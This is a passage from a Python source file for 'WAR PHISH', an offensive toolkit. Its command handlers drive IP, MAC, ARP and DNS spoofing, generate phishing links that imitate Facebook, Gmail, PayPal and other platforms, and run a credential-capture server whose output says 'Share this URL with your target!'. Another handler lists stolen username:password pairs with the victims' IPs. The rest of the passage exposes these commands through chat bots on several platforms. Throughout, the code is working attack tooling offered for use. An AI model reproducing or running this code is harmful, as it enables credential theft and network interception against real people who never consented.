        command = ' '.join(args[1:]) if len(args) > 1 else None
        result = self.executor.ssh(user, host, command)
        return result
    
    def _cmd_shodan(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: shodan <query>'}
        query = ' '.join(args)
        result = self.executor.shodan(query)
        return result
    
    def _cmd_spoof_ip(self, args):
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: spoof_ip <original_ip> <spoofed_ip> <target> [interface]'}
        result = self.spoof.spoof_ip(args[0], args[1], args[2], args[3] if len(args) > 3 else "eth0")
        return {'success': result['success'], 'output': result['output']}
    
    def _cmd_spoof_mac(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: spoof_mac <interface> <new_mac>'}
        result = self.spoof.spoof_mac(args[0], args[1])
        return {'success': result['success'], 'output': result['output']}
    
    def _cmd_arp_spoof(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: arp_spoof <target_ip> <spoof_ip> [interface]'}
        result = self.spoof.arp_spoof(args[0], args[1], args[2] if len(args) > 2 else "eth0")
        return {'success': result['success'], 'output': result['output']}
    
    def _cmd_dns_spoof(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: dns_spoof <domain> <fake_ip> [interface]'}
        result = self.spoof.dns_spoof(args[0], args[1], args[2] if len(args) > 2 else "eth0")
        return {'success': result['success'], 'output': result['output']}
    
    def _cmd_stop_spoof(self, args):
        result = self.spoof.stop_spoofing(args[0] if args else None)
        return {'success': result['success'], 'output': result['output']}
    
    def _cmd_generate_phishing(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: generate_phishing <platform>\nAvailable: facebook, instagram, twitter, gmail, linkedin, github, paypal, warphish'}
        platform = args[0].lower()
        link_id = str(uuid.uuid4())[:8]
        url = f"http://{self._get_local_ip()}:8080"
        
        if self.db.save_phishing_link(link_id, platform, url):
            return {'success': True, 'output': f"""
🎣 Phishing link generated!
  Platform: {platform}
  Link ID: {link_id}
  URL: {url}
  
Use: phishing_start {link_id} to start the server
QR Code: http://{self._get_local_ip()}:5000/qr/{link_id}
"""}
        return {'success': False, 'output': 'Failed to generate phishing link'}
    
    def _cmd_phishing_start(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: phishing_start <link_id> [port]'}
        link_id = args[0]
        port = int(args[1]) if len(args) > 1 else 8080
        
        # Get platform from database
        links = self.db.get_phishing_links()
        platform = None
        for link in links:
            if link['id'] == link_id:
                platform = link['platform']
                break
        
        if not platform:
            return {'success': False, 'output': f'Link ID {link_id} not found'}
        
        if self.phishing.start(link_id, platform, port):
            url = self.phishing.get_url()
            return {'success': True, 'output': f"""
🎣 Phishing server started!
  Link ID: {link_id}
  Platform: {platform}
  URL: {url}
  Port: {port}
  
Share this URL with your target!
Credentials will be captured here."""}
        return {'success': False, 'output': 'Failed to start phishing server'}
    
    def _cmd_phishing_stop(self, args):
        self.phishing.stop()
        return {'success': True, 'output': 'Phishing server stopped'}
    
    def _cmd_phishing_status(self, args):
        status = "🟢 Running" if self.phishing.running else "⚪ Stopped"
        url = self.phishing.get_url() if self.phishing.running else "N/A"
        return {'success': True, 'output': f"Phishing Server Status: {status}\nURL: {url}"}
    
    def _cmd_phishing_links(self, args):
        links = self.db.get_phishing_links()
        if not links:
            return {'success': True, 'output': 'No phishing links generated'}
        output = "🎣 Phishing Links:\n"
        for link in links:
            active = "🟢" if self.phishing.running and self.phishing.link_id == link['id'] else "⚪"
            output += f"  {active} {link['id'][:8]} - {link['platform']} ({link['clicks']} clicks) - {link['created_at'][:19]}\n"
        return {'success': True, 'output': output}
    
    def _cmd_credentials(self, args):
        creds = self.db.get_captured_credentials(20)
        if not creds:
            return {'success': True, 'output': 'No credentials captured yet'}
        output = "📧 Captured Credentials:\n"
        for c in creds:
            output += f"  {c['timestamp'][:19]} - {c['username']}:{c['password']} from {c['ip_address']}\n"
        return {'success': True, 'output': output}
    
    def _get_local_ip(self) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

# =====================
# MAIN APPLICATION
# =====================
class WarPhish:
    def __init__(self):
        self.db = DatabaseManager()
        self.spoof_engine = SpoofingEngine(self.db)
        self.phishing_server = PhishingServer(self.db)
        self.handler = CommandHandler(self.db, self.spoof_engine, self.phishing_server)
        self.web_server = WebServer(self.handler, self.db, 5000)
        self.discord_bot = DiscordBot(self.handler)
        self.telegram_bot = TelegramBot(self.handler)
        self.slack_bot = SlackBot(self.handler)
        self.imessage_bot = iMessageBot(self.handler)
        self.signal_bot = SignalBot(self.handler)
        self.google_chat_bot = GoogleChatBot(self.handler)
        self.running = True
    
    def print_banner(self):
        banner = f"""
{Colors.RED}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.RESET}                         🦈 {Colors.BOLD}WAR PHISH{Colors.RESET} 🦈                                    {Colors.RED}║
║{Colors.RESET}              Advanced Cybersecurity Command Center                              {Colors.RED}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.RESET}  📡 Network Scanning    🎭 Spoofing Engine     🎣 Phishing Suite                {Colors.RED}║
║{Colors.RESET}  🤖 Multi-Platform Bots 🌐 Web Dashboard       🔌 SSH/Netcat/Nmap                {Colors.RED}║
║{Colors.RESET}  💻 Discord | Telegram | Slack | iMessage | Signal | Google Chat                {Colors.RED}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.RESET}                    🔥 5000+ SECURITY COMMANDS AT YOUR FINGERTIPS 🔥               {Colors.RED}║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
        """
        print(banner)
    
    def setup_bots(self):
        print(f"\n{Colors.CYAN}🤖 Bot Configuration{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*50}{Colors.RESET}")
        
        # Discord
        if input(f"{Colors.ORANGE}Start Discord bot? (y/n): {Colors.RESET}").strip().lower() == 'y':
            token = input(f"{Colors.ORANGE}Enter Discord bot token: {Colors.RESET}").strip()
            prefix = input(f"{Colors.ORANGE}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if token:
                self.discord_bot.start(token, prefix)
        
        # Telegram
        if input(f"{Colors.ORANGE}Start Telegram bot? (y/n): {Colors.RESET}").strip().lower() == 'y':
            api_id = input(f"{Colors.ORANGE}Enter API ID: {Colors.RESET}").strip()
            api_hash = input(f"{Colors.ORANGE}Enter API Hash: {Colors.RESET}").strip()
            bot_token = input(f"{Colors.ORANGE}Enter Bot Token (optional): {Colors.RESET}").strip()
            if api_id and api_hash:
                self.telegram_bot.start(api_id, api_hash, bot_token if bot_token else None)
        
        # Slack
        if input(f"{Colors.ORANGE}Start Slack bot? (y/n): {Colors.RESET}").strip().lower() == 'y':
            token = input(f"{Colors.ORANGE}Enter Slack bot token: {Colors.RESET}").strip()
            channel = input(f"{Colors.ORANGE}Enter channel (default: general): {Colors.RESET}").strip() or 'general'
            if token:
                self.slack_bot.start(token, channel)
        
        # iMessage (macOS only)
        if IMESSAGE_AVAILABLE and input(f"{Colors.ORANGE}Start iMessage bot? (y/n): {Colors.RESET}").strip().lower() == 'y':
            self.imessage_bot.start()
        
        # Signal
        if SIGNAL_CLI_AVAILABLE and input(f"{Colors.ORANGE}Start Signal bot? (y/n): {Colors.RESET}").strip().lower() == 'y':
            self.signal_bot.start()
        
        # Google Chat
        if input(f"{Colors.ORANGE}Start Google Chat bot? (y/n): {Colors.RESET}").strip().lower() == 'y':
            self.google_chat_bot.start()
    
    def run(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self.print_banner()
        
        # Start web server
        self.web_server.start()
        
        # Setup bots
        self.setup_bots()
        
        print(f"\n{Colors.GREEN}✅ WAR PHISH Ready!{Colors.RESET}")
        print(f"{Colors.CYAN}   🌐 Web Dashboard: http://localhost:5000{Colors.RESET}")
        print(f"{Colors.CYAN}   💡 Type 'help' for commands, 'clear' to clear, 'exit' to quit{Colors.RESET}\n")
        
        while self.running:
            try:
                prompt = f"{Colors.RED}[WARPHISH]{Colors.RESET} "
                command = input(prompt).strip()
                
                if command.lower() == 'exit':
                    self.running = False
                    break
                
                result = self.handler.execute(command, "local")
                if result.get('output'):
                    print(result['output'])
                elif result.get('error'):
                    print(f"{Colors.RED}Error: {result['error']}{Colors.RESET}")
                
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}Shutting down...{Colors.RESET}")
                self.running = False
            except Exception as e:
                print(f"{Colors.RED}Error: {e}{Colors.RESET}")
        
        # Cleanup
        self.phishing_server.stop()
        self.web_server.stop()
        self.db.close()
        print(f"\n{Colors.GREEN}✅ WAR PHISH shutdown complete{Colors.RESET}")

def main():
    try:
        print(f"{Colors.RED}🦈 Starting WAR PHISH...{Colors.RESET}")
        
        if sys.version_info < (3, 7):
            print(f"{Colors.RED}❌ Python 3.7+ required{Colors.RESET}")
            sys.exit(1)
        
        app = WarPhish()
        app.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}👋 Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}❌ Fatal error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()